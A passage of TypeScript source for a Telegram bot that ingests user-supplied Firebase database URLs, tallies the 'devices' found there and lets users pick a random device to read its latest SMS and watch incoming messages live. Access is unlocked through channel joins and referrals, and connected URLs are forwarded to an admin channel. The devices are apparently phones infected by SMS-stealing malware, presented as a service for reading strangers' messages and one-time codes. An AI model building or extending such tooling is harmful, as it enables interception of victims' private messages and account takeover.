      const url = validateFirebaseUrl(rawUrl);
      if (existingConnections.some(connection => connection.firebaseUrl === url)) {
        results.push({ url, status: "duplicate", detail: "Already connected" });
        continue;
      }
      const firebaseId = await connectNewFirebase(ctx, url);
      const summary = await getSummary(firebaseId);
      existingConnections.push({
        id: firebaseId,
        telegramId: id,
        firebaseUrl: url,
        displayName: `Firebase ${existingConnections.length + 1}`,
        status: "connected",
        addedAt: new Date().toISOString()
      });
      added++;
      results.push({ url, status: "connected", detail: "Connected successfully", summary });
    } catch (error) {
      results.push({ url: rawUrl, status: "failed", detail: shortError(error) });
    }
  }

  setSession(id, { awaiting: undefined });
  const { connections, summaries } = await allSummary(id);
  const totals = [...summaries.values()].reduce((acc, summary) => {
    addSummary(acc, summary);
    return acc;
  }, { total: 0, online: 0, offline: 0 });
  const newDevices = results
    .filter(result => result.status === "connected")
    .reduce((total, result) => total + (result.summary?.total ?? 0), 0);
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "📊 FIREBASE BATCH RESULT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    ...results.map((result, index) => {
      const label = result.status === "connected" ? "✅ CONNECTED"
        : result.status === "duplicate" ? "↩️ DUPLICATE"
          : "❌ DEAD / FAILED";
      const deviceSummary = result.summary
        ? `\n   Devices: ${result.summary.total} · Online: ${result.summary.online} · Offline: ${result.summary.offline}`
        : "";
      return `${index + 1}. ${label}\n   ${result.url}\n   ${result.detail}${deviceSummary}`;
    }),
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    "📈 TOTAL ACCOUNT SUMMARY",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `🔥 Firebase Added This Round: ${added}`,
    `🗂 Total Firebase Connections: ${connections.length}/∞`,
    `📱 Devices Before: ${beforeTotals.total}`,
    `➕ New Devices Added: ${newDevices}`,
    `📱 Devices After: ${totals.total}`,
    `🟢 Total Online: ${totals.online}`,
    `🔴 Total Offline: ${totals.offline}`,
    "",
    `✅ Connected: ${results.filter(result => result.status === "connected").length}`,
    `❌ Dead / Failed: ${results.filter(result => result.status === "failed").length}`,
    `↩️ Duplicate: ${results.filter(result => result.status === "duplicate").length}`,
  ];
  await updateBatchProgress(ctx, progress.message_id, lines.join("\n").slice(0, 3900), homeKeyboard(admin(ctx)));
  await forwardAuditSummary(id, results, connections.length, totals);
}

async function forwardAuditSummary(
  telegramId: number,
  results: BatchResult[],
  totalConnections: number,
  totals: DeviceSummary
) {
  const chatId = (await getSetting("audit_channel_chat_id", "")).trim();
  if (!chatId) return;
  const connectedResults = results.filter(result => result.status === "connected");
  if (!connectedResults.length) return;
  const statusLines = connectedResults.map((result, index) => {
    const link = result.url.slice(0, 220);
    const deviceSummary = result.summary
      ? `\n   Devices: ${result.summary.total} · Online: ${result.summary.online} · Offline: ${result.summary.offline}`
      : "";
    return `${index + 1}. ✅ CONNECTED\n   ${link}${deviceSummary}`;
  });
  const message = [
    "━━━━━━━━━━━━━━━━━━━━",
    "📊 FIREBASE BATCH SUMMARY",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `👤 User ID: ${telegramId}`,
    `🗂 Total Connections: ${totalConnections}`,
    `📱 Devices: ${totals.total} · 🟢 ${totals.online} · 🔴 ${totals.offline}`,
    "",
    ...statusLines,
    "",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n").slice(0, 3900);
  try {
    await bot.telegram.sendMessage(chatId, message);
  } catch (error) {
    await logSystem("warn", "audit_channel_forward_failed", shortError(error), telegramId);
  }
}

type SelectedPoolDevice = {
  firebaseId: string;
  firebaseUrl: string;
  sourceName: string;
  device: Device;
};

async function selectRandomPoolDevice(telegramId: number): Promise<SelectedPoolDevice> {
  // The background pool loop keeps this cache warm. Do not make every button
  // tap wait for a full Firebase scan; fall back to one scan only on cold start.
  const pool = poolSnapshotCache?.value ?? await readPoolSources(false);
  if (!pool.configuredSources) throw new Error("Admin has not configured any active Firebase device sources.");

  const failures = pool.sources
    .filter(source => !source.ok || !source.devices.length)
    .map(source => `${source.panel.displayName}: ${source.error ?? "no devices found"}`);
  const available = pool.sources.flatMap(source =>
    source.ok ? source.devices.map(device => ({ panel: source.panel, device, devices: source.devices })) : []
  );
  if (!available.length) {
    throw new Error(`No Firebase source could provide a device.\n\n${failures.slice(0, 3).join("\n")}`);
  }

  const online = available.filter(candidate => candidate.device.status === "online");
  const candidates = online.length ? online : available;
  const selected = candidates[Math.floor(Math.random() * candidates.length)];
  const existingConnections = await getConnections(telegramId);
  const existing = existingConnections.find(connection => connection.firebaseUrl === selected.panel.firebaseUrl);
  const firebaseId = existing?.id ?? await addConnection(telegramId, selected.panel.firebaseUrl, selected.panel.displayName);
  await replaceDevices(firebaseId, selected.devices);
  await markConnectionChecked(firebaseId, "connected");
  return {
    firebaseId,
    firebaseUrl: selected.panel.firebaseUrl,
    sourceName: selected.panel.displayName,
    device: selected.device,
  };
}

async function renderSelectedDevice(ctx: Context, selected: SelectedPoolDevice) {
  const id = userId(ctx);
  setSession(id, {
    screen: "device_detail",
    selectedFirebaseId: selected.firebaseId,
    selectedDeviceId: selected.device.normalizedDeviceId,
    monitoring: true,
  });
  startMonitor(id, selected.firebaseId, selected.device, {
    chatId: ctx.chat?.id,
    messageId: callbackMessageId(ctx),
    sourceName: selected.sourceName
  });
  await editOrReplyWithConfiguredImage(
    ctx,
    deviceDetailText(selected.device, selected.sourceName),
    deviceDetailKeyboard(selected.firebaseId, selected.device.normalizedDeviceId),
    IMAGE_SETTING_KEYS.device
  );
}

async function generateAndRenderDevice(ctx: Context) {
  const id = userId(ctx);
  unselectDevice(id);
  await answerCallback(ctx, "Selecting a secure device…");
  try {
    const selected = await selectRandomPoolDevice(id);
    await renderSelectedDevice(ctx, selected);
  } catch (error) {
    await editOrReply(
      ctx,
      `❌ DEVICE GENERATION FAILED\n\n${shortError(error)}\n\nPlease try again after the admin adds a working Firebase source.`,
      navKeyboard("home")
    );
  }
}

async function renderLastFiveSms(ctx: Context, firebaseId: string, normalized: string) {
  const id = userId(ctx);
  const session = getSession(id);
  if (session.selectedFirebaseId !== firebaseId || session.selectedDeviceId !== normalized) {
    await answerCallback(ctx, "Select a device first.", { show_alert: true });
    return;
  }
  const connection = await getConnection(id, firebaseId);
  if (!connection) {
    await answerCallback(ctx, "Device source not found.", { show_alert: true });
    return;
  }
  await answerCallback(ctx, "Loading latest messages…");
  try {
    const root = await readFirebase(connection.firebaseUrl);
    const device = extractDevices(root).find(item => item.normalizedDeviceId === normalized);
    if (!device) {
      await answerCallback(ctx, "Selected device is no longer available.", { show_alert: true });
      unselectDevice(id);
      await renderHome(ctx);
      return;
    }
    const events = collectEvents(device, root)
      .sort((a, b) => {
        const aTime = a.timestamp ? Date.parse(a.timestamp) : 0;
        const bTime = b.timestamp ? Date.parse(b.timestamp) : 0;
        return (Number.isNaN(bTime) ? 0 : bTime) - (Number.isNaN(aTime) ? 0 : aTime);
      })
      .slice(0, 5);
    setSession(id, { screen: "last_sms" });
    startMonitor(id, firebaseId, device);
    await editOrReply(ctx, lastSmsText(device, events), lastSmsKeyboard(firebaseId, normalized));
  } catch (error) {
    await answerCallback(ctx, "Unable to read SMS", { show_alert: true });
    await editOrReply(ctx, `❌ Could not read the selected device.\n\n${shortError(error)}`, navKeyboard("home"));
  }
}

bot.start(async ctx => {
  unselectDevice(userId(ctx));
  if (!(await baseGuard(ctx))) return;
  await registerStartReferral(ctx);
  if (admin(ctx) || (await getAccessStatus(userId(ctx))).active) await renderHome(ctx, true);
  else await renderAccessGate(ctx, true);
});
bot.command("cancel", async ctx => {
  clearSession(userId(ctx));
  const keyboard = premiumizeKeyboard(homeKeyboard(admin(ctx))) as any;
  await ctx.reply("✅ Cancelled.", Markup.inlineKeyboard(keyboard.inline_keyboard));
});
bot.command("myid", async ctx => { await ctx.reply(`🆔 Your Telegram ID is:\n${userId(ctx)}\n\nUse this numeric ID as ADMIN_TELEGRAM_ID for admin access.`); });

bot.on("text", async (ctx, next) => {
  if (!(await guard(ctx))) return;
  if (ctx.message.text.trim().startsWith("/")) return next();
  const session = getSession(userId(ctx));
  if (session.awaiting === "firebase_url") {
    try {
      await addFirebaseBatch(ctx, ctx.message.text);
    } catch (error) {
      setSession(userId(ctx), { awaiting: undefined });
      await logSystem("warn", "firebase_batch_failed", error instanceof Error ? error.message : String(error), userId(ctx));
      await ctx.reply(`❌ Firebase batch check failed.\n\n${shortError(error)}\n\nSend /start to try again.`);
    }
    return;
  }
  if (session.awaiting === "free_firebase_url" && admin(ctx)) {
    try {
      await addFreePoolFromText(ctx, ctx.message.text);
    } catch (error) {
      await ctx.reply(`❌ Could not add free Firebase.\n\n${shortError(error)}\n\nFormat: Optional Name | https://your-project.firebaseio.com\nFor bulk: one source per line or comma-separated.`);
    }
    return;
  }
  if (session.awaiting === "required_channel" && admin(ctx)) {
    try {
      await addChannelFromText(ctx, ctx.message.text);
    } catch (error) {
      await ctx.reply(`❌ Could not add required channel.\n\n${shortError(error)}\n\nFormat: @channelusername | https://t.me/channelusername`);
    }
    return;
  }
  if (session.awaiting === "audit_channel" && admin(ctx)) {
    try {
      const parts = ctx.message.text.split("|").map(part => part.trim()).filter(Boolean);
      const chatId = parts[0];
      if (!chatId || !(/^@[\w\d_]{3,}$/.test(chatId) || /^-?\d+$/.test(chatId))) {
        throw new Error("Send a public @channel username or numeric chat ID.");
      }
      const link = parts[1] ?? "";
      if (link && !/^https:\/\/t\.me\//i.test(link)) {
        throw new Error("Channel link must start with https://t.me/");
      }
      const chat = await ctx.telegram.getChat(chatId);
      const title = ("title" in chat && chat.title)
        || ("username" in chat && chat.username ? `@${chat.username}` : chatId);
      await setSetting("audit_channel_chat_id", chatId);
      await setSetting("audit_channel_title", title);
      await setSetting("audit_channel_link", link);
      setSession(userId(ctx), { awaiting: undefined });
      await logSystem("info", "audit_channel_configured", `${title} (${chatId})`, userId(ctx));
      await ctx.reply(`✅ Audit channel configured.\n\n${title}\n${chatId}`);
      await renderAdminAuditChannel(ctx);
    } catch (error) {
      await ctx.reply(`❌ Could not configure audit channel.\n\n${shortError(error)}\n\nFormat: @channelusername | https://t.me/channelusername`);
    }
    return;
  }
  if (session.awaiting === "referral_minimum" && admin(ctx)) {
    const minimum = Number(ctx.message.text.trim());
    if (!Number.isInteger(minimum) || minimum < 0 || minimum > 1000) {
      await ctx.reply("❌ Minimum referrals must be a whole number from 0 to 1000.");
      return;
    }
    await setSetting("minimum_referrals", String(minimum));
    setSession(userId(ctx), { awaiting: undefined });
    await logSystem("info", "minimum_referrals_changed", `Minimum qualified referrals set to ${minimum}`, userId(ctx));
    await ctx.reply(`✅ Minimum qualified referrals set to ${minimum}.`);
    await renderAdminFreeAccess(ctx);
    return;
  }
  if (session.awaiting === "access_duration" && admin(ctx)) {
    const duration = Number(ctx.message.text.trim());
    if (!Number.isInteger(duration) || duration < 1 || duration > 1440) {
      await ctx.reply("❌ Access duration must be a whole number from 1 to 1440 minutes.");
      return;
    }
    await setSetting("access_duration_minutes", String(duration));
    setSession(userId(ctx), { awaiting: undefined });
    await logSystem("info", "access_duration_changed", `Timed access duration set to ${duration} minutes`, userId(ctx));
    await ctx.reply(`✅ Timed access duration set to ${duration} minutes.`);
    await renderAdminFreeAccess(ctx);
    return;
  }
  if (session.awaiting === "gift_access_user" && admin(ctx)) {
    const target = Number(ctx.message.text.trim());
    if (!Number.isSafeInteger(target) || target <= 0) {
      await ctx.reply("❌ Send a valid numeric Telegram user ID.");
      return;
    }
    setSession(userId(ctx), { awaiting: undefined, giftAccessTargetId: target, screen: "admin_gift_access" });
    const keyboard = premiumizeKeyboard(adminGiftSpecificKeyboard(target) as any) as any;
    await ctx.reply(adminGiftSpecificText(target), Markup.inlineKeyboard(keyboard.inline_keyboard));
    return;
  }
  if (
    (session.awaiting === "referral_message" ||
      session.awaiting === "maintenance_message" ||
      session.awaiting === "how_to_use_message" ||
      session.awaiting === "welcome_message") &&
    admin(ctx)
  ) {
    const value = ctx.message.text.trim().slice(0, 3900);
    if (!value) {
      await ctx.reply("❌ Message cannot be empty. Send the text again or use /cancel.");
      return;
    }
    const key = session.awaiting === "referral_message"
      ? "referral_message"
      : session.awaiting === "maintenance_message"
        ? "maintenance_message"
        : session.awaiting === "how_to_use_message"
          ? "how_to_use_message"
          : "welcome_message";
    const label = session.awaiting === "referral_message"
      ? "Referral"
      : session.awaiting === "maintenance_message"
        ? "Maintenance"
        : session.awaiting === "how_to_use_message"
          ? "How to Use"
          : "Welcome";
    await setSetting(key, value);
    setSession(userId(ctx), { awaiting: undefined });
    await logSystem("info", "bot_content_changed", `${label} message updated`, userId(ctx));
    await ctx.reply(`✅ ${label} message saved.`);
    await renderAdminContent(ctx);
    return;
  }
  if (session.awaiting === "broadcast" && admin(ctx)) {
    setSession(userId(ctx), { awaiting: undefined });
    const users = await (await import("./db.js")).query<{ telegram_id: string }>("SELECT telegram_id FROM users WHERE is_banned = false", []);
    setSession(userId(ctx), { screen: "broadcast_preview" });
    const previewKeyboard = premiumizeKeyboard({
      inline_keyboard: [[
        { text: "✅ Send", callback_data: `broadcast_send:${Buffer.from(ctx.message.text).toString("base64url")}` },
        { text: "❌ Cancel", callback_data: "admin" }
      ]]
    }) as any;
    await ctx.reply(
      `━━━━━━━━━━━━━━━━━━━━\n📢 BROADCAST PREVIEW\n━━━━━━━━━━━━━━━━━━━━\n\nRecipients: ${users.length} Users\n\n${ctx.message.text}`,
      Markup.inlineKeyboard(previewKeyboard.inline_keyboard)
    );
    return;
  }
  return next();
});

bot.on("photo", async ctx => {
  if (!(await guard(ctx))) return;
  const session = getSession(userId(ctx));
  if (!admin(ctx) || !["image_welcome", "image_access", "image_device"].includes(session.awaiting ?? "")) return;
  const awaiting = session.awaiting as "image_welcome" | "image_access" | "image_device";
  const settingKey = awaiting === "image_welcome"
    ? IMAGE_SETTING_KEYS.welcome
    : awaiting === "image_access"
      ? IMAGE_SETTING_KEYS.access
      : IMAGE_SETTING_KEYS.device;
  const photo = ctx.message.photo.at(-1);
  if (!photo) {
    await ctx.reply("❌ Telegram photo data was not found. Please send the image again.");
    return;
  }
  await setSetting(settingKey, photo.file_id);
  setSession(userId(ctx), { awaiting: undefined });
  await logSystem("info", "bot_image_changed", `${awaiting} image updated`, userId(ctx));
  await ctx.reply("✅ Image saved. The new visual will appear in that screen's next message.");
  await renderAdminImages(ctx);
});

bot.action("noop", async ctx => answerCallback(ctx));
bot.action("home", async ctx => {
  unselectDevice(userId(ctx));
  if (!(await guard(ctx))) return;
  await answerCallback(ctx);
  await renderHome(ctx, false, false);
  startHomeMonitor(ctx);
  refreshHomeInBackground(ctx);
});
bot.action("free_panels", async ctx => {
  if (await baseGuard(ctx)) {
    await answerCallback(ctx);
    await renderAccessGate(ctx);
  }
});
bot.action("verify_access", async ctx => {
  if (!(await baseGuard(ctx))) return;
  const id = userId(ctx);
  const channels = await getRequiredChannels();
  const membership = await checkRequiredChannels(ctx, channels);
  if (!membership.allJoined) {
    await answerCallback(ctx, "Join every required channel first.", { show_alert: true });
    await renderAccessGate(ctx);
    return;
  }
  await qualifyReferral(id);
  const stats = await getReferralStats(id);
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  if (stats.qualified < minimum) {
    await answerCallback(ctx, `Need ${minimum - stats.qualified} more qualified referral(s).`, { show_alert: true });
    await renderAccessGate(ctx);
    return;
  }
  const duration = Math.max(1, Number(await getSetting("access_duration_minutes", "45")) || 45);
  await grantTimedAccess(id, duration);
  await logSystem("info", "timed_access_granted", `${duration} minute access granted`, id);
  await answerCallback(ctx, `Access granted for ${duration} minutes`);
  await renderHome(ctx);
});
bot.action(["new_device", "change_device"], async ctx => {
  if (await guard(ctx)) await generateAndRenderDevice(ctx);
});
bot.action("claim_free_firebase", async ctx => {
  if (!(await guard(ctx))) return;
  const channels = await getRequiredChannels();
  const membership = await checkRequiredChannels(ctx, channels);
  if (!membership.allJoined) {
    await answerCallback(ctx, "Join every required channel first.", { show_alert: true });
    await renderFreePanels(ctx);
    return;
  }
  await qualifyReferral(userId(ctx));
  const stats = await getReferralStats(userId(ctx));
  const minimum = Number(await getSetting("minimum_referrals", "3"));
  if (stats.qualified < minimum) {
    await answerCallback(ctx, `Need ${minimum - stats.qualified} more qualified referral(s).`, { show_alert: true });
    return;
  }
  const panel = await claimFreeFirebase(userId(ctx));
  if (!panel) {
    await answerCallback(ctx, "No free Firebase is available right now.", { show_alert: true });
    await renderFreePanels(ctx);
    return;
  }
  const connection = (await getConnections(userId(ctx))).find(item => item.firebaseUrl === panel.firebaseUrl);
  if (connection) {
    try {
      await scanConnection(userId(ctx), connection.id);
    } catch (error) {
      await logSystem("warn", "free_firebase_initial_scan_failed", shortError(error), userId(ctx));
    }
  }
  await answerCallback(ctx, "Free Firebase claimed!");
  await renderFreePanels(ctx);
});
bot.action(["help", "how_to_use"], async ctx => {
  await answerCallback(ctx);
  await editOrReply(ctx, await getSetting("how_to_use_message", DEFAULT_HOW_TO_USE_MESSAGE), navKeyboard());
});
bot.action("add_firebase", async ctx => {
  if (!(await guard(ctx))) return;
  setSession(userId(ctx), { awaiting: "firebase_url", screen: "add_firebase" });
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n➕ ADD FIREBASE\n━━━━━━━━━━━━━━━━━━━━\n\nSend any number of Firebase URLs in one message.\nUse one URL per line or separate them with commas.\n\nExample:\nhttps://project-one-default-rtdb.firebaseio.com\nhttps://project-two-default-rtdb.firebaseio.com\n\nEvery URL will be checked one-by-one. Dead URLs will be reported separately, with device totals shown before and after the batch.\n\nℹ️ Short Firebase summaries may be shared with admins for support.\n\nSend /cancel to stop.`, { inline_keyboard: [[{ text: "⬅️ Back to Home", callback_data: "home" }]] });
});
bot.action("my_firebase", async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderFirebaseList(ctx); } });
bot.action("devices", async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderDevices(ctx); } });
bot.action(/^devices_firebase:(.+)$/, async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderDevicePage(ctx, ctx.match[1], 0); } });
bot.action(/^firebase:(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const connection = await getConnection(userId(ctx), ctx.match[1]);
  if (!connection) {
    await answerCallback(ctx, "Not found", { show_alert: true });
    return;
  }
  let summary: DeviceSummary;
  try {
    summary = (await scanConnection(userId(ctx), connection.id)).summary;
  } catch {
    summary = { total: 0, online: 0, offline: 0 };
  }
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n🔥 ${connection.displayName}\n━━━━━━━━━━━━━━━━━━━━\n\n🟢 Status: ${connection.status}\n\n📱 Total Devices: ${summary.total}\n🟢 Online: ${summary.online}\n🔴 Offline: ${summary.offline}\n\n🕒 Last Updated: ${connection.lastChecked ?? "Not checked"}`, { inline_keyboard: [[{ text: "📱 View Devices", callback_data: `devices_firebase:${connection.id}` }, { text: "🔄 Rescan Firebase", callback_data: `rescan:${connection.id}` }], [{ text: "🗑 Remove Firebase", callback_data: `remove:${connection.id}` }], [{ text: "⬅️ Back", callback_data: "my_firebase" }, { text: "🏠 Home", callback_data: "home" }]] });
});
bot.action(/^page:([^:]+):(\d+)$/, async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await renderDevicePage(ctx, ctx.match[1], Number(ctx.match[2])); } });
bot.action(/^rescan:(.+)$/, async ctx => { if (await guard(ctx)) { await answerCallback(ctx); await scanAndRender(ctx, ctx.match[1]); } });
bot.action(/^remove:(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const connection = await getConnection(userId(ctx), ctx.match[1]);
  if (!connection) {
    await answerCallback(ctx, "Not found", { show_alert: true });
    return;
  }
  await removeConnection(userId(ctx), connection.id);
  stopMonitorsFor(connection.id);
  await answerCallback(ctx, "Firebase removed");
  await renderFirebaseList(ctx);
});
bot.action(/^device:([^:]+):(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const firebaseId = ctx.match[1];
  const normalized = decodeURIComponent(ctx.match[2]);
  const [connection, cachedDevices] = await Promise.all([
    getConnection(userId(ctx), firebaseId),
    getDevices(firebaseId),
  ]);
  let device = cachedDevices.find(d => d.normalizedDeviceId === normalized);
  if (!connection) {
    await answerCallback(ctx, "Firebase not found", { show_alert: true });
    return;
  }
  if (!device) {
    try {
      const fresh = await scanConnection(userId(ctx), firebaseId);
      device = fresh.devices.find(d => d.normalizedDeviceId === normalized);
    } catch (error) {
      await answerCallback(ctx, "Unable to refresh device", { show_alert: true });
      await editOrReply(ctx, `❌ CONNECTION FAILED\n\n${error instanceof Error ? error.message : "Unable to read Firebase data."}`, navKeyboard());
      return;
    }
  }
  if (!device) {
    await answerCallback(ctx, "Device not found", { show_alert: true });
    return;
  }
  unselectDevice(userId(ctx));
  setSession(userId(ctx), { selectedFirebaseId: firebaseId, selectedDeviceId: normalized, screen: "device_detail", monitoring: true });
  startMonitor(userId(ctx), firebaseId, device, {
    chatId: ctx.chat?.id,
    messageId: callbackMessageId(ctx),
    sourceName: connection.displayName
  });
  await answerCallback(ctx);
  await editOrReply(ctx, deviceDetailText(device, connection.displayName), deviceDetailKeyboard(firebaseId, normalized));
});
bot.action(/^last_sms:([^:]+):(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  await renderLastFiveSms(ctx, ctx.match[1], decodeURIComponent(ctx.match[2]));
});
bot.action(/^events:([^:]+):(.+)$/, async ctx => {
  if (!(await guard(ctx))) return;
  const firebaseId = ctx.match[1], normalized = decodeURIComponent(ctx.match[2]);
  let fresh: FreshSnapshot;
  try {
    fresh = await scanConnection(userId(ctx), firebaseId);
  } catch (error) {
    await answerCallback(ctx, "Unable to refresh device", { show_alert: true });
    await editOrReply(ctx, `❌ CONNECTION FAILED\n\n${error instanceof Error ? error.message : "Unable to read Firebase data."}`, navKeyboard());
    return;
  }
  const device = fresh.devices.find(d => d.normalizedDeviceId === normalized);
  if (!device) {
    await answerCallback(ctx, "Device not found", { show_alert: true });
    return;
  }
  startMonitor(userId(ctx), firebaseId, device);
  setSession(userId(ctx), { monitoring: true });
  await answerCallback(ctx);
  await editOrReply(ctx, `━━━━━━━━━━━━━━━━━━━━\n📡 LIVE EVENTS\n━━━━━━━━━━━━━━━━━━━━\n\nListening for new authorized application events...\n\n🟢 Monitoring Active\n\nDevice:\n${device.deviceId}\n\n━━━━━━━━━━━━━━━━━━━━`, { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: `events:${firebaseId}:${encodeURIComponent(normalized)}` }, { text: "🛑 Stop Monitoring", callback_data: `stop_events:${firebaseId}:${encodeURIComponent(normalized)}` }], [{ text: "🚫 Unselect Number", callback_data: "unselect_device" }], [{ text: "⬅️ Device Details", callback_data: `device:${firebaseId}:${encodeURIComponent(normalized)}` }, { text: "🏠 Home", callback_data: "home" }]] });
});
bot.action(/^stop_events:([^:]+):(.+)$/, async ctx => { unselectDevice(userId(ctx)); clearSession(userId(ctx)); await answerCallback(ctx); await editOrReply(ctx, "🔴 Number Unselected\n\nMonitoring stopped. No more messages will be sent for this number.", navKeyboard("home")); });
bot.action("unselect_device", async ctx => { const id = userId(ctx); unselectDevice(id); clearSession(id); await answerCallback(ctx); await editOrReply(ctx, "✅ Number Unselected\n\nMonitoring stopped. No more messages will be sent for this number.", navKeyboard("home")); });
bot.action("back", async ctx => {
  unselectDevice(userId(ctx));
  if (!(await guard(ctx))) return;
  await answerCallback(ctx);
  const screen = back(userId(ctx));
  if (screen === "my_firebase") await renderFirebaseList(ctx);
  else if (screen === "devices") await renderDevices(ctx);
  else {
    await renderHome(ctx, false, false);
    startHomeMonitor(ctx);
    refreshHomeInBackground(ctx);
  }
});

bot.command("admin", async ctx => {
  if (!(await guard(ctx))) return;
  if (!admin(ctx)) {
    await ctx.reply("❌ Access Denied\n\nYour Telegram ID is not configured as the admin ID. Send /myid, then set ADMIN_TELEGRAM_ID to that numeric ID and restart the bot.");
    return;
  }
  await renderAdmin(ctx);
});
async function renderAdmin(ctx: Context) {
  if (!admin(ctx)) return;
  const stats = await adminStats();
  const maintenanceEnabled = (await getSetting("maintenance_mode", "false")) === "true";
  const pool = cachedPoolSources() ?? await readPoolSources(false).catch(() => undefined);
  const poolSummary = (pool?.sources ?? []).filter(source => source.ok || source.stale).reduce((total, source) => {
    addSummary(total, summaryForDevices(source.devices));
    return total;
  }, { total: 0, online: 0, offline: 0 });
  await editOrReply(ctx, adminDashboardText(stats, poolSummary, maintenanceEnabled), adminKeyboard(maintenanceEnabled));
}

async function renderAdminUsers(ctx: Context) {
  if (!admin(ctx)) return;
  const users = await getAdminUsers(20);
  await editOrReply(ctx, adminUsersText(users), adminUsersKeyboard(users));
}

async function renderAdminConnections(ctx: Context) {
  if (!admin(ctx)) return;
  const connections = await getAdminConnections(20);
  await editOrReply(ctx, adminConnectionsText(connections), adminConnectionsKeyboard());
}

async function renderAdminSettings(ctx: Context) {
  if (!admin(ctx)) return;
  const limit = Number(await getSetting("firebase_limit", "10"));
  const maintenanceEnabled = (await getSetting("maintenance_mode", "false")) === "true";
  await editOrReply(ctx, adminSettingsText(limit, maintenanceEnabled), adminSettingsKeyboard(limit, maintenanceEnabled));
}
bot.action("admin", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdmin(ctx); } });
bot.action("admin_refresh", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdmin(ctx); } });
bot.action("admin_stats", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdmin(ctx); } });
bot.action("admin_users", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminUsers(ctx); } });
bot.action("admin_connections", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminConnections(ctx); } });
bot.action("admin_settings", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminSettings(ctx); } });
bot.action("admin_free", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminFreeAccess(ctx); } });
bot.action("admin_content", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminContent(ctx); } });
bot.action("admin_images", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await answerCallback(ctx);
  await renderAdminImages(ctx);
});
bot.action(/^admin_image_(welcome|access|device)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const kind = ctx.match[1] as "welcome" | "access" | "device";
  const labels = {
    welcome: "WELCOME / HOME",
    access: "ACCESS GATE",
    device: "DEVICE DETAILS"
  };
  setSession(userId(ctx), {
    awaiting: `image_${kind}` as "image_welcome" | "image_access" | "image_device",
    screen: "admin_images"
  });
  await answerCallback(ctx);
  await editOrReply(
    ctx,
    `🖼 SET ${labels[kind]} IMAGE\n\nSend one Telegram photo now.\n\nUse a clean premium banner or portrait artwork. The original user flow stays unchanged; this image is shown above the screen message.\n\nSend /cancel to stop.`,
    navKeyboard("admin_images")
  );
});
bot.action(/^admin_image_remove_(welcome|access|device)$/, async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  const kind = ctx.match[1] as "welcome" | "access" | "device";
  const settingKey = kind === "welcome"
    ? IMAGE_SETTING_KEYS.welcome
    : kind === "access"
      ? IMAGE_SETTING_KEYS.access
      : IMAGE_SETTING_KEYS.device;
  await setSetting(settingKey, "");
  await logSystem("info", "bot_image_removed", `${kind} image removed`, userId(ctx));
  await answerCallback(ctx, "Image removed");
  await renderAdminImages(ctx);
});
bot.action("admin_content_referral", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "referral_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("referral"), navKeyboard("admin_content"));
});
bot.action("admin_content_maintenance", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "maintenance_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("maintenance"), navKeyboard("admin_content"));
});
bot.action("admin_content_how_to_use", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "how_to_use_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("how_to_use"), navKeyboard("admin_content"));
});
bot.action("admin_content_welcome", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "welcome_message", screen: "admin_content" });
  await answerCallback(ctx);
  await editOrReply(ctx, adminContentPrompt("welcome"), navKeyboard("admin_content"));
});
bot.action("admin_audit_channel", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await answerCallback(ctx);
  await renderAdminAuditChannel(ctx);
});
bot.action("admin_audit_channel_edit", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  setSession(userId(ctx), { awaiting: "audit_channel", screen: "admin_audit_channel" });
  await answerCallback(ctx);
  await editOrReply(
    ctx,
    "➕ SET ADMIN AUDIT CHANNEL\n\nSend a public channel username or numeric chat ID.\n\nFormat:\n@yourchannel | https://t.me/yourchannel\n\nThe bot must be a member/admin of the channel.\nOnly short Firebase summaries will be forwarded.\n\nSend /cancel to stop.",
    navKeyboard("admin_audit_channel")
  );
});
bot.action("admin_audit_channel_disable", async ctx => {
  if (!(await guard(ctx)) || !admin(ctx)) return;
  await setSetting("audit_channel_chat_id", "");
  await setSetting("audit_channel_title", "");
  await setSetting("audit_channel_link", "");
